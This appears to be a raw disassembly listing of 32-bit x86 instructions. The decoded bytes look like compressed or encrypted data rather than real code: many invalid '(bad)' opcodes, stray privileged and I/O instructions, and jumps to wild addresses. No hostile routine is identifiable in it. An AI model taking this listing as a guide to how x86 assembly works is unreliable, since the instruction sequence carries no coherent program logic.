  42ee1b:	shl    DWORD PTR [ecx+0x3c],1
  42ee1e:	enter  0x2f24,0x33
  42ee22:	gs pop esi
  42ee24:	mov    edi,0xaedb0b67
  42ee29:	ret    
  42ee2a:	xlat   BYTE PTR ds:[ebx]
  42ee2b:	daa    
  42ee2c:	adc    al,BYTE PTR [eax-0x80]
  42ee2f:	stos   BYTE PTR es:[edi],al
  42ee30:	outs   dx,DWORD PTR ds:[esi]
  42ee31:	imul   DWORD PTR [esi]
  42ee33:	shr    BYTE PTR [ebx+0x4d],cl
  42ee36:	jmp    0x4e33db8c
  42ee3b:	inc    esi
  42ee3c:	and    al,0x9e
  42ee3e:	sti    
  42ee3f:	pop    ecx
  42ee40:	push   ecx
  42ee41:	in     eax,0x59
  42ee43:	ins    DWORD PTR es:[edi],dx
  42ee44:	out    dx,eax
  42ee45:	sbb    eax,0x9a5b4049
  42ee4a:	les    edx,FWORD PTR [eax+0x620857e2]
  42ee50:	test   eax,0x33d3a405
  42ee55:	and    al,0xfe
  42ee57:	aam    0x63
  42ee59:	sub    esi,ebx
  42ee5b:	or     BYTE PTR [ebx-0x65076830],cl
  42ee61:	ficom  WORD PTR [ebx-0x1e]
  42ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee65:	popa   
  42ee66:	lahf   
  42ee67:	jge    0x42ee63
  42ee69:	cli    
  42ee6a:	or     BYTE PTR [ebx-0x31],dl
  42ee6d:	add    ebx,DWORD PTR [edi-0x217bfd50]
  42ee73:	xchg   ebp,eax
  42ee74:	sbb    BYTE PTR [ebx],ah
  42ee76:	retf   
  42ee77:	sbb    eax,0xf9f311d9
  42ee7c:	(bad)  
  42ee7d:	test   al,0x13
  42ee7f:	in     al,0x1a
  42ee81:	dec    eax
  42ee82:	pop    ss
  42ee83:	cli    
  42ee84:	xchg   ecx,eax
  42ee85:	lea    edx,[esi-0x3c]
  42ee88:	fadd   DWORD PTR [edi-0x55]
  42ee8b:	adc    BYTE PTR [ebx],bl
  42ee8d:	neg    DWORD PTR [ecx+0x5f]
  42ee90:	fs out 0x6e,eax
  42ee93:	out    0xa9,al
  42ee95:	push   edx
  42ee96:	xor    ecx,DWORD PTR [edi+ecx*8+0xb108961]
  42ee9d:	scas   eax,DWORD PTR es:[edi]
  42ee9e:	ja     0x42eee7
  42eea0:	loopne 0x42ee95
  42eea2:	mov    al,0xf5
  42eea4:	add    ecx,edi
  42eea6:	dec    esp
  42eea7:	sub    bl,BYTE PTR [ebp+0x20dd96c]
  42eead:	clc    
  42eeae:	fistp  WORD PTR [edi+0x383b2539]
  42eeb4:	xchg   ebx,eax
  42eeb5:	sbb    cl,0x5e
  42eeb8:	and    BYTE PTR [ebx-0x1f],ah
  42eebb:	adc    esi,0xffffff81
  42eebe:	les    edx,FWORD PTR [edi]
  42eec0:	adc    eax,ecx
  42eec2:	add    eax,0x8b55c444
  42eec7:	xchg   esi,eax
  42eec8:	inc    edx
  42eec9:	pop    edi
  42eeca:	push   ecx
  42eecb:	jmp    0x42ef42
  42eecd:	inc    edx
  42eece:	in     eax,0x28
  42eed0:	pushf  
  42eed1:	push   0x15
  42eed3:	push   edi
  42eed4:	shl    BYTE PTR [esi],0x8e
  42eed7:	inc    edx
  42eed8:	in     al,dx
  42eed9:	xchg   ebp,eax
  42eeda:	loop   0x42ee65
  42eedc:	or     al,0x1a
  42eede:	fst    DWORD PTR [eax-0xc4a826b]
  42eee4:	(bad)  
  42eee5:	pop    esp
  42eee6:	int3   
  42eee7:	(bad)  
  42eee8:	xor    ebx,DWORD PTR [edx-0x22]
  42eeeb:	inc    ecx
  42eeec:	xchg   ebp,eax
  42eeed:	or     al,BYTE PTR [eax]
	...
  42ef53:	add    BYTE PTR [eax],al
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	imul   esp,DWORD PTR [edx-0x898662f],0x1
  42ef69:	add    BYTE PTR [eax],al
  42ef6b:	add    DWORD PTR [eax],eax
  42ef6d:	add    ch,bl
  42ef6f:	push   ds
  42ef70:	pop    esi
  42ef71:	mov    dh,0xb4
  42ef73:	sub    esp,esi
  42ef75:	add    al,0x33
  42ef77:	nop
  42ef78:	push   cs
  42ef79:	pop    edx
  42ef7a:	push   edi
  42ef7b:	jns    0x42ef8e
  42ef7d:	mov    bl,0xfd
  42ef7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef80:	push   0x53
  42ef82:	pop    ds
  42ef83:	lds    esi,FWORD PTR [ebx+0x2f4f1e45]
  42ef89:	aaa    
  42ef8a:	in     eax,dx
  42ef8b:	jp     0x42ef3a
  42ef8d:	ret    0x13fe
  42ef90:	ss pop esp
  42ef92:	mov    gs,edi
  42ef94:	sub    al,0x8c
  42ef96:	mov    bl,0x4a
  42ef98:	add    DWORD PTR [ebx-0x44],esp
  42ef9b:	pusha  
  42ef9c:	add    ah,ah
  42ef9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef9f:	js     0x42ef7a
  42efa1:	push   esi
  42efa2:	dec    edi
  42efa3:	pop    esp
  42efa4:	inc    ebx
  42efa5:	push   cs
  42efa6:	out    dx,al
  42efa7:	fsub   DWORD PTR [edi]
  42efa9:	mov    dl,0x7f
  42efab:	retf   
  42efac:	xchg   dh,ah
  42efae:	sub    al,0x45
  42efb0:	aad    0x7d
  42efb2:	ins    DWORD PTR es:[edi],dx
  42efb3:	cs int 0xc5
  42efb6:	xchg   esp,eax
  42efb7:	sbb    eax,0x6ab6a7e7
  42efbc:	test   eax,0x7b7837ea
  42efc1:	mov    esp,0xb19673e2
  42efc6:	jge    0x42ef59
  42efc8:	call   0x7aeaea89
  42efcd:	out    dx,eax
  42efce:	data16 std 
  42efd0:	dec    ebp
  42efd1:	mov    dh,0xd
  42efd3:	adc    BYTE PTR [edi-0x40],dl
  42efd6:	popf   
  42efd7:	mov    al,0x73
  42efd9:	cmp    esi,DWORD PTR [edi]
  42efdb:	push   ecx
  42efdc:	dec    esp
  42efdd:	inc    edx
  42efde:	fwait
  42efdf:	daa    
  42efe0:	scas   eax,DWORD PTR es:[edi]
  42efe1:	cmp    al,BYTE PTR [eax+edi*4+0x40eb22e2]
  42efe8:	sub    esp,esp
  42efea:	cmp    al,0xbc
  42efec:	(bad)  
  42efed:	ds jmp 0x7138:0xc5532a36
  42eff5:	pushf  
  42eff6:	xchg   BYTE PTR [eax+0x60],al
  42eff9:	imul   ebx,DWORD PTR [ecx+0x77],0x7b8e1a44
  42f000:	dec    eax
  42f001:	outs   dx,BYTE PTR ds:[esi]
  42f002:	(bad)  
  42f004:	stos   BYTE PTR es:[edi],al
  42f005:	push   ds
  42f006:	push   ss
  42f007:	fiadd  DWORD PTR [esi+0x19]
  42f00a:	fbstp  TBYTE PTR [edi+ecx*4]
  42f00e:	or     ebx,DWORD PTR [eax]
  42f010:	push   esp
  42f011:	jmp    0xd510:0x612c305e
  42f018:	ins    BYTE PTR es:[edi],dx
  42f019:	loope  0x42efe4
  42f01b:	cmc    
  42f01c:	xchg   ebx,eax
  42f01d:	inc    BYTE PTR [edi-0x6c640646]
  42f023:	push   esi
  42f024:	pop    ecx
  42f025:	inc    ecx
  42f026:	jo     0x42f01b
  42f028:	(bad)  
  42f02a:	adc    al,0x25
  42f02c:	jg     0x42f01b
  42f02e:	std    
  42f02f:	adc    DWORD PTR [ebx],esi
  42f031:	and    eax,0xb8e14b8b
  42f036:	pop    edi
  42f037:	push   ds
  42f038:	xchg   ecx,eax
  42f039:	pusha  
  42f03a:	es cwde 
  42f03c:	retf   
  42f03d:	xchg   esi,eax
  42f03e:	or     ch,BYTE PTR [ebx+0x7a]
  42f041:	jmp    0x6d08c085
  42f046:	or     BYTE PTR [eax+edi*4+0x42],dl
  42f04a:	out    dx,eax
  42f04b:	ins    DWORD PTR es:[edi],dx
  42f04c:	cdq    
  42f04d:	stc    
  42f04e:	dec    ecx
  42f04f:	clc    
  42f050:	gs push edi
  42f052:	(bad)  
  42f053:	adc    esp,DWORD PTR [ecx+ecx*4+0x19883c68]
  42f05a:	add    bl,bl
  42f05c:	dec    esp
  42f05d:	sti    
  42f05e:	mov    bl,0x15
  42f060:	dec    ebx
  42f061:	lea    esp,[eax-0x72442f01]
  42f067:	push   0xffffffaf
  42f069:	add    ebp,DWORD PTR [edi-0x7a]
  42f06c:	push   ebx
  42f06d:	push   esp
	...
  42f0d6:	adc    bh,BYTE PTR [esi]
  42f0d8:	int    0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	xchg   ecx,eax
  42f0e3:	and    edi,DWORD PTR ds:0x1f867a9
  42f0e9:	add    BYTE PTR [eax],al
  42f0eb:	add    DWORD PTR [eax],eax
  42f0ed:	add    BYTE PTR [ecx+0x1c],al
  42f0f0:	imul   esi,esp,0xffffffb6
  42f0f3:	retf   
  42f0f4:	sub    DWORD PTR [esi-0x3b],ebp
  42f0f7:	cld    
  42f0f8:	inc    ebx
  42f0f9:	sbb    eax,0xc4aea78e
  42f0fe:	imul   ebp,eax,0xb4582b34
  42f104:	sbb    al,0xe8
  42f106:	fmul   DWORD PTR [ebp-0x3d]
  42f109:	das    
  42f10a:	(bad)  
  42f10b:	cmp    DWORD PTR [ebx-0x6c],edx
  42f10e:	adc    ecx,esp
  42f110:	mov    eax,0xd81c657c
  42f115:	inc    esp
  42f116:	push   ds
  42f117:	push   ecx
  42f118:	xchg   BYTE PTR [edi+0x7d2eeb71],al
  42f11e:	sar    BYTE PTR [ebp+0x27],1
  42f121:	aad    0xc4
  42f123:	ins    DWORD PTR es:[edi],dx
  42f124:	xchg   ebx,eax
  42f125:	xor    eax,0xdbffbc22
  42f12a:	mov    esp,0x33e423cf
  42f12f:	sub    ebx,DWORD PTR ds:0xf9edfffc
  42f135:	fstp   DWORD PTR [ebx]
  42f137:	jb     0x42f116
  42f139:	into   
  42f13a:	aam    0x55
  42f13c:	clc    
  42f13d:	xor    BYTE PTR [esi+0x7fae3328],bl
  42f143:	test   ebp,esi
  42f145:	dec    esi
  42f146:	push   cs
  42f147:	icebp  
  42f148:	hlt    
  42f149:	jg     0x42f108
  42f14b:	add    al,0x6
  42f14e:	pop    edx
  42f14f:	xchg   DWORD PTR [ecx+0x69],esi
  42f152:	mov    ah,0x66
  42f154:	cmp    eax,0xd9da4fe6
  42f159:	lods   eax,DWORD PTR ds:[esi]
  42f15a:	test   al,0x48
  42f15c:	cmp    al,0x70
  42f15e:	sub    al,0x80
  42f160:	and    ch,BYTE PTR [edx+0x4c812978]
  42f166:	ss jg  0x42f0ef
  42f169:	mov    BYTE PTR [ebx],al
  42f16b:	call   0x5bc4:0xbc0a6415
  42f172:	das    
  42f173:	jp     0x42f168
  42f175:	stc    
  42f176:	push   esi
  42f177:	or     ebp,DWORD PTR [ebx-0x3a]
  42f17a:	std    
  42f17b:	sahf   
  42f17c:	setg   BYTE PTR [edi+0x7a]
  42f180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f181:	xor    al,0xa6
  42f183:	stos   BYTE PTR es:[edi],al
  42f184:	int    0xf5
  42f186:	and    esp,DWORD PTR [ecx]
  42f188:	pminub mm2,QWORD PTR [edx-0x27b59c3e]
  42f18f:	add    eax,DWORD PTR [edx-0x3c7c28d8]
  42f195:	add    esp,DWORD PTR [edi+edi*4+0x18b3fd6d]
  42f19c:	repz out dx,al
  42f19e:	pop    eax
  42f19f:	mov    edx,0x4577ef86
  42f1a4:	xlat   BYTE PTR ds:[ebx]
  42f1a5:	sub    edi,edi
  42f1a7:	mov    ecx,0xa9765c2c
  42f1ac:	aaa    
  42f1ad:	xor    ch,ch
  42f1af:	(bad)  
  42f1b1:	push   ecx
  42f1b2:	xlat   BYTE PTR ds:[ebx]
  42f1b3:	mov    dh,BYTE PTR [edx-0x32f23118]
  42f1b9:	dec    edx
  42f1ba:	xchg   edx,eax
  42f1bb:	mov    DWORD PTR [eax],eax
  42f1bd:	inc    edx
  42f1be:	xchg   edx,eax
  42f1bf:	lods   al,BYTE PTR ds:[esi]
  42f1c0:	lds    edx,FWORD PTR [ecx]
  42f1c2:	and    bh,BYTE PTR [ebp+0x7f134d67]
  42f1c8:	jp     0x42f175
  42f1ca:	mov    al,ds:0x95bf037
  42f1cf:	push   eax
  42f1d0:	jnp    0x42f169
  42f1d2:	lods   al,BYTE PTR ds:[esi]
  42f1d4:	inc    eax
  42f1d5:	(bad)  
  42f1d6:	mov    edi,0x1759b397
  42f1db:	cmc    
  42f1dc:	jae    0x42f168
  42f1de:	ret    0x2ff4
  42f1e1:	das    
  42f1e2:	pop    eax
  42f1e3:	sahf   
  42f1e4:	and    esi,0xfa379e0b
  42f1ea:	cmp    bh,BYTE PTR [ebp+0xb097]
	...
  42f254:	add    BYTE PTR [eax],al
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	mov    esp,0x670f46a2
  42f267:	stc    
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	stos   BYTE PTR es:[edi],al
  42f26f:	mov    dl,0xfa
  42f271:	or     DWORD PTR [ecx*4+0x4e5624c3],ebx
  42f278:	cmp    eax,0x1b5e29dc
  42f27d:	je     0x42f29d
  42f27f:	or     bh,BYTE PTR [edx-0x66ff9294]
  42f285:	repz cmp al,0xf7
  42f288:	stc    
  42f289:	int3   
  42f28a:	je     0x42f2c9
  42f28c:	dec    esp
  42f28d:	scas   al,BYTE PTR es:[edi]
  42f28e:	sub    al,dh
  42f290:	int3   
  42f291:	xchg   edx,eax
  42f292:	stos   BYTE PTR es:[edi],al
  42f293:	mov    ebp,0xee56bcd4
  42f298:	lods   al,BYTE PTR ds:[esi]
  42f299:	pop    edi
  42f29a:	xchg   esp,eax
  42f29b:	cdq    
  42f29c:	inc    esp
  42f29d:	xor    DWORD PTR [edx-0x5f],edx
  42f2a0:	sysret 
  42f2a2:	and    al,0x7a
  42f2a4:	das    
  42f2a5:	cmp    ah,BYTE PTR [ebx]
  42f2a7:	mov    ds:0x42631514,eax
  42f2ac:	fmul   DWORD PTR [ecx+0x3f]
  42f2af:	push   ecx
  42f2b0:	jbe    0x42f25f
  42f2b2:	or     al,0x23
  42f2b4:	push   esi
  42f2b5:	enter  0x9c65,0xa
  42f2b9:	sub    DWORD PTR [edi+0x9a05cc0],ebp
  42f2bf:	add    BYTE PTR [ecx+0x1a098717],dl
  42f2c5:	cld    
  42f2c6:	mov    ds:0x8792938f,al
  42f2cb:	push   ss
  42f2cc:	jmp    0x93ff2802
  42f2d1:	pusha  
  42f2d2:	push   0xffffffda
  42f2d4:	adc    ch,bh
  42f2d6:	inc    edx
  42f2d7:	dec    ebx
  42f2d8:	push   ecx
  42f2d9:	out    0xa,al
  42f2db:	add    eax,0xe59e9c1c
  42f2e0:	jmp    0x42f32d
  42f2e2:	test   DWORD PTR [eax+esi*8],0xcc7b54f6
  42f2e9:	xor    ecx,DWORD PTR [esi]
  42f2eb:	jae    0x42f2e5
  42f2ed:	sub    BYTE PTR [esi+0x2b],0xc5
  42f2f1:	pop    ss
  42f2f2:	inc    eax
  42f2f3:	and    al,0x7d
  42f2f5:	retf   0xdf46
  42f2f8:	sahf   
  42f2f9:	stos   BYTE PTR es:[edi],al
  42f2fa:	mov    ch,0x9f
  42f2fc:	or     DWORD PTR [esi+0x6],esp
  42f2ff:	(bad)  
  42f300:	out    dx,eax
  42f301:	inc    esp
  42f302:	test   DWORD PTR [eax+0x12],eax
  42f305:	call   0x83fd9a9c
  42f30a:	js     0x42f347
  42f30c:	mov    eax,0x13d94c0e
  42f311:	in     al,dx
  42f312:	call   0x6bfe9588
  42f317:	pop    esp
  42f318:	neg    BYTE PTR [esi]
  42f31a:	int    0x87
  42f31c:	dec    edx
  42f31d:	add    DWORD PTR [edi-0x2cb83f90],esi
  42f323:	loope  0x42f310
  42f325:	add    al,0x3d
  42f327:	add    al,0xdf
  42f329:	push   eax
  42f32a:	jge    0x42f2f0
  42f32c:	dec    dl
  42f32e:	das    
  42f32f:	mov    BYTE PTR [ecx+0x3c],cl
  42f332:	arpl   dx,cx
  42f334:	fyl2xp1 
  42f336:	ret    0x3d7f
  42f339:	(bad)  
  42f33a:	mov    edx,DWORD PTR [edi-0x273ad59d]
  42f340:	loop   0x42f305
  42f342:	leave  
  42f343:	dec    edx
  42f344:	mov    esi,0x96906777
  42f349:	outs   dx,DWORD PTR ds:[esi]
  42f34a:	xchg   ebp,eax
  42f34b:	popf   
  42f34c:	lds    eax,FWORD PTR [edx-0x51]
  42f34f:	xchg   ecx,eax
  42f350:	mov    ch,BYTE PTR [ebx]
  42f352:	test   eax,0xb61f125a
  42f357:	shr    BYTE PTR [edx-0x5a],0x85
  42f35b:	mov    ch,0x87
  42f35d:	xor    BYTE PTR [ebx+0x20],bh
  42f360:	mov    dh,0x1b
  42f362:	xor    al,0x20
  42f364:	ins    DWORD PTR es:[edi],dx
  42f365:	rcr    dh,cl
  42f367:	adc    dl,0x67
  42f36a:	xor    DWORD PTR [ebx-0x48],eax
  42f36d:	fadd   DWORD PTR [eax]
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	sub    esi,DWORD PTR [esi]
  42f3e4:	enter  0x6763,0xfa
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	push   es
  42f3ef:	js     0x42f373
  42f3f1:	and    edi,DWORD PTR [eax]
  42f3f3:	(bad)
  42f3f6:	int    0x34
  42f3f8:	shl    ch,0x74
  42f3fb:	xchg   ebp,eax
  42f3fc:	jp     0x42f3e7
  42f3fe:	push   0xd10931d7
  42f403:	jne    0x42f39b
  42f405:	push   esp
  42f406:	dec    eax
  42f407:	in     al,0xbf
  42f409:	xor    edx,DWORD PTR fs:[ecx+0x79]
  42f40d:	xchg   ebx,eax
  42f40e:	pop    ecx
  42f40f:	jg     0x42f392
  42f411:	ret    0xa89c
  42f414:	jecxz  0x42f3d3
  42f416:	pop    eax
  42f417:	adc    BYTE PTR [ebx+0x78],bh
  42f41a:	push   esp
  42f41b:	cmp    bh,al
  42f41d:	mov    eax,ds:0x6de48d41
  42f422:	cmc    
  42f423:	or     BYTE PTR [edi+0x5e393006],cl
  42f429:	cmp    DWORD PTR [ebx-0x61],ecx
  42f42c:	ins    BYTE PTR es:[edi],dx
  42f42d:	scas   eax,DWORD PTR es:[edi]
  42f42e:	pop    ecx
  42f42f:	rol    esp,cl
  42f431:	push   0xffffffe4
  42f433:	scas   eax,DWORD PTR es:[edi]
  42f434:	jl     0x42f3ba
  42f436:	lds    ebp,FWORD PTR [edx+0x14]
  42f439:	and    edi,DWORD PTR [eax+ebp*2-0x6a]
  42f43d:	push   esp
  42f43e:	jecxz  0x42f409
  42f440:	xchg   ecx,eax
  42f441:	mov    eax,0x71ba82fe
  42f446:	out    dx,al
  42f447:	pop    eax
  42f448:	aaa    
  42f449:	adc    al,0x7e
  42f44b:	retf   
  42f44c:	retf   
  42f44d:	test   al,0xd9
  42f44f:	or     esp,ebp
  42f451:	int3   
  42f452:	push   esi
  42f453:	mov    BYTE PTR [edx+0x6e],dh
  42f456:	lahf   
  42f457:	mov    edi,0x52ad4f47
  42f45c:	and    al,0xc3
  42f45e:	dec    esp
  42f45f:	adc    al,0x13
  42f461:	dec    edx
  42f462:	xor    eax,0xe467b1b8
  42f467:	icebp  
  42f468:	mov    ds:0x8d65e6fb,eax
  42f46d:	rcl    DWORD PTR [ebp+0x6a],1
  42f470:	mov    eax,ecx
  42f472:	lock in eax,dx
  42f474:	jle    0x42f466
  42f476:	ror    DWORD PTR [esi+0x6ef6566a],0x4b
  42f47d:	push   edx
  42f47e:	sbb    al,0xb9
  42f480:	mov    ecx,0xf06be321
  42f485:	or     eax,0xf0e5b766
  42f48a:	outs   dx,DWORD PTR ds:[esi]
  42f48b:	inc    ecx
  42f48c:	mov    ds:0x8263c77d,al
  42f491:	dec    ecx
  42f492:	lock int3 
  42f494:	aad    0xc6
  42f496:	out    0x3c,eax
  42f498:	push   esp
  42f499:	pop    ebx
  42f49a:	mov    bl,0xeb
  42f49c:	mov    dh,0xf1
  42f49e:	xor    dl,bl
  42f4a0:	loop   0x42f4b8
  42f4a2:	in     al,dx
  42f4a3:	test   DWORD PTR [ecx],ebx
  42f4a5:	call   0x1e4e5be4
  42f4aa:	pop    ebp
  42f4ab:	mov    esp,0x83496108
  42f4b0:	jb     0x42f48f
  42f4b2:	rol    DWORD PTR [edi+0x48],1
  42f4b5:	sbb    DWORD PTR [ebx+esi*8],esp
  42f4b8:	inc    ebp
  42f4b9:	imul   ebx,DWORD PTR [esp+edi*2],0x1f583f26
  42f4c0:	retf   0x69fa
  42f4c3:	and    al,0x9e
  42f4c5:	add    eax,0xbc077a42
  42f4ca:	loopne 0x42f4aa
  42f4cc:	push   ss
  42f4cd:	(bad)  
  42f4ce:	int3   
  42f4cf:	sar    BYTE PTR [edx-0x61],0x23
  42f4d3:	jmp    0x739b:0x671708b8
  42f4da:	into   
  42f4db:	push   edx
  42f4dc:	jnp    0x42f541
  42f4de:	sbb    al,0x90
  42f4e0:	cmp    ch,BYTE PTR [edx+0x3a]
  42f4e3:	das    
  42f4e4:	push   ss
  42f4e5:	(bad)  
  42f4e7:	into   
  42f4e8:	pusha  
  42f4e9:	les    ebx,FWORD PTR [ecx-0x34]
  42f4ec:	pop    ecx
  42f4ed:	push   ebx
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	nop
  42f563:	mov    WORD PTR [ecx+0x1fb67ce],cs
  42f569:	add    BYTE PTR [eax],al
  42f56b:	add    DWORD PTR [eax],eax
  42f56d:	add    bh,al
  42f56f:	add    DWORD PTR [ebp+0x1c6701b5],esp
  42f575:	push   esi
  42f576:	aad    0xca
  42f578:	push   esp
  42f579:	mov    ebp,DWORD PTR [eax-0x5a8ef08f]
  42f57f:	cs (bad) 
  42f581:	mov    esi,0x6f808427
  42f586:	dec    esi
  42f587:	mov    cl,0x84
  42f589:	and    BYTE PTR [eax-0x2],dl
  42f58c:	les    esi,FWORD PTR [eax+0x4b2a7f9e]
  42f592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f593:	cmp    eax,0xa4490636
  42f598:	rcr    BYTE PTR [edx+0x17],cl
  42f59b:	cmp    esp,DWORD PTR [esi-0x28]
  42f59e:	inc    edx
  42f59f:	cmp    al,0x4
  42f5a1:	sbb    esp,ecx
  42f5a3:	pop    esi
  42f5a4:	addr16 aam 0x87
  42f5a7:	rcr    DWORD PTR [edx],1
  42f5a9:	add    ebx,edi
  42f5ab:	jo     0x42f5b6
  42f5ad:	pop    esp
  42f5ae:	adc    DWORD PTR [edx-0x5b75d604],ebx
  42f5b4:	sub    BYTE PTR [edi+0x36],dh
  42f5b7:	mov    ch,dl
  42f5b9:	mov    al,BYTE PTR [ebx+0x1a522a6e]
  42f5bf:	ja     0x42f5d6
  42f5c1:	pop    ecx
  42f5c2:	sub    al,dl
  42f5c4:	lea    ebx,[edx+0x53]
  42f5c7:	ss add eax,0xc8f1c465
  42f5cd:	mov    ch,0x4d
  42f5cf:	or     eax,0x1ff7f5f0
  42f5d4:	sbb    esi,DWORD PTR ds:0x7df
  42f5d9:	sbb    dl,BYTE PTR [edx-0x7e9da153]
  42f5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f5e0:	add    ebx,DWORD PTR [ebp-0x72bdb17f]
  42f5e6:	stc    
  42f5e7:	icebp  
  42f5e8:	aad    0x2
  42f5ea:	bound  ebp,QWORD PTR [ebp-0x31]
  42f5ed:	inc    esi
  42f5ee:	jmp    0x42f5eb
  42f5f0:	add    eax,0x387a4bdf
  42f5f5:	sti    
  42f5f6:	scas   al,BYTE PTR es:[edi]
  42f5f7:	mov    ah,0x81
  42f5f9:	dec    esi
  42f5fa:	push   ecx
  42f5fb:	rcr    BYTE PTR [esi+0x75bff5a9],1
  42f601:	jno    0x42f640
  42f603:	mov    eax,0x723ade2
  42f608:	push   0xffffffba
  42f60a:	daa    
  42f60b:	mov    ah,0x59
  42f60d:	or     DWORD PTR [esi+0x58],ebp
  42f610:	sbb    edi,ebp
  42f612:	(bad)  
  42f613:	mov    cl,0x84
  42f615:	mov    ebp,0x1fa6fa34
  42f61a:	xchg   ecx,eax
  42f61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f61c:	ins    BYTE PTR es:[edi],dx
  42f61d:	xor    al,0x1
  42f61f:	jp     0x42f641
  42f621:	leave  
  42f622:	leave  
  42f623:	aas    
  42f624:	lods   al,BYTE PTR ds:[esi]
  42f625:	xchg   ecx,eax
  42f626:	mov    cl,0xab
  42f628:	jae    0x42f618
  42f62a:	clc    
  42f62b:	xor    ah,BYTE PTR [edx-0x4be36a63]
  42f631:	push   DWORD PTR [ecx]
  42f633:	push   ecx
  42f634:	adc    BYTE PTR [eax+eiz*1],dh
  42f637:	sti    
  42f638:	mul    DWORD PTR [esi+0x7cdc0a02]
  42f63e:	mov    ds:0x2ccf0472,al
  42f643:	dec    ebx
  42f644:	fidivr DWORD PTR [edx]
  42f646:	fld    DWORD PTR [edx]
  42f648:	pop    es
  42f649:	mov    dl,0x18
  42f64b:	outs   dx,DWORD PTR ds:[esi]
  42f64c:	or     ch,BYTE PTR [esi-0x733915af]
  42f652:	xchg   edx,eax
  42f653:	adc    bh,ch
  42f655:	inc    esi
  42f656:	mov    edi,0x3514249a
  42f65b:	pop    esi
  42f65c:	aaa    
  42f65d:	pop    esp
  42f65e:	mov    bh,0x4f
  42f660:	adc    BYTE PTR [esi-0x149fc1df],0x4a
  42f667:	scas   eax,DWORD PTR es:[edi]
  42f668:	xor    dl,BYTE PTR [ecx+0x121f4532]
	...
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	ja     0x42f701
  42f6e4:	jg     0x42f6d3
  42f6e6:	addr16 cld 
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	shr    DWORD PTR [eax+eax*1],0x5d
  42f6f2:	dec    ebx
  42f6f3:	xor    DWORD PTR [ebp-0x6cc00f1],eax
  42f6f9:	jl     0x42f71e
  42f6fb:	mov    cl,0x5b
  42f6fd:	mov    ebp,0x1ec8c16a
  42f702:	fucomi st,st(5)
  42f704:	das    
  42f705:	aam    0xca
  42f707:	mov    esi,0x78712466
  42f70c:	inc    esi
  42f70d:	xor    eax,ecx
  42f70f:	mov    ds:0x9bd7caa7,al
  42f714:	rol    dh,1
  42f716:	(bad)  
  42f717:	(bad)  
  42f718:	mov    edi,0xb47c6368
  42f71d:	xor    DWORD PTR [esi-0x48e3a943],ebx
  42f723:	(bad)  
  42f724:	pop    ebx
  42f725:	pop    edi
  42f726:	rcr    DWORD PTR [ebx+ebx*1+0x22],cl
  42f72a:	and    ebp,esp
  42f72c:	pop    ecx
  42f72d:	xor    BYTE PTR [edi],0xfa
  42f730:	mov    dl,0x96
  42f732:	xor    eax,0x2291d3d8
  42f737:	xchg   ebx,eax
  42f738:	ds jmp 0x42f72e
  42f73b:	xor    ah,BYTE PTR [edx]
  42f73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f73e:	iret   
  42f73f:	pop    edi
  42f740:	mov    edx,0x56d4870c
  42f745:	inc    ecx
  42f746:	test   BYTE PTR [eax+esi*8],0xfe
  42f74a:	jne    0x42f78b
  42f74c:	cmp    al,0xe1
  42f74e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42f750:	cli    
  42f751:	sub    cl,BYTE PTR ds:0x3eb8732d
  42f758:	adc    al,0xde
  42f75a:	fwait
  42f75b:	or     eax,0x8ebb9c5f
  42f760:	mov    cl,0x5e
  42f762:	cmc    
  42f763:	or     BYTE PTR [ebx],ch
  42f765:	clc    
  42f766:	retf   0xb99
  42f769:	ficom  DWORD PTR [esi]
  42f76b:	outs   dx,DWORD PTR ds:[esi]
  42f76c:	xor    dh,ah
  42f76e:	jle    0x42f740
  42f770:	pop    es
  42f771:	sbb    bl,BYTE PTR [edi-0x3febe924]
  42f777:	into   
  42f778:	inc    esp
  42f779:	mov    esi,0xe9ca6bf8
  42f77e:	popa   
  42f77f:	in     eax,dx
  42f780:	mov    ds:0x980639f7,eax
  42f785:	mov    bl,0x1e
  42f787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f788:	fimul  DWORD PTR [ecx]
  42f78a:	adc    al,0x92
  42f78c:	leave  
  42f78d:	imul   esp,DWORD PTR [eax],0x6985529f
  42f793:	ficomp WORD PTR [edx+0x54d7d8bf]
  42f799:	sub    edi,esp
  42f79b:	jmp    0x42f76a
  42f79d:	jecxz  0x42f721
  42f79f:	iret   
  42f7a0:	pop    ebp
